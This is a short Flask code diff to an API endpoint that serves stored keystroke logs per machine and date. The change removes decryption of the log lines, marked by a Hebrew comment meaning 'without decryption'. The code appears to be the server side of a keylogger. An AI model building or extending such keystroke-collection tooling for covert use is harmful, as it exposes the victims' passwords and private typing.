@@ -82,7 +82,6 @@ def get_dates():
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_keystrokes():
-    encryptor = Encryptor(Config.ENCRYPTION_KEY)
     machine = request.args.get("machine")
     date = request.args.get("date")
     if not machine or not date:
@@ -93,7 +92,7 @@ def get_keystrokes():
         return jsonify({"machine": machine, "logs": []}), 200
 
     with open(file_path, "r", encoding="utf-8") as f:
-        logs = [encryptor.decrypt(line.strip()) for line in f if line.strip()]
+        logs = [line.strip() for line in f if line.strip()]  # ללא פענוח
 
     return jsonify({
         "machine": machine,
